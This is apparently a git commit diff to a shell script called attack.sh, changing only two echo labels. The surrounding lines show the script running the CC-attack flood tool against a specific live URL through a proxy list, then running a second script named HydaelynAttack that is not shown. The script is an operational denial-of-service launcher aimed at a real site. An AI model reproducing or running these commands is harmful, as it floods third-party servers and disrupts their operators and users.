5694336d86b15a073f733e9a6f8487a68d51c5f3
NyaaCaster <110224598+NyaaCaster@users.noreply.github.com>
2023-01-04 14:11:20 +0800

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -18,9 +18,9 @@ git pull
 cd ..
 
 echo ""
-echo "updata CC-attack"
+echo "CC-attack"
 python3 CC-attack/cc.py -url http://fwe22.top/ -f proxy.txt -v 5 -s 30
 
 echo ""
-echo "updata HydaelynAttack"
+echo "HydaelynAttack"
 python3 HydaelynAttack/HydaelynAttack_p_once_noLog.py
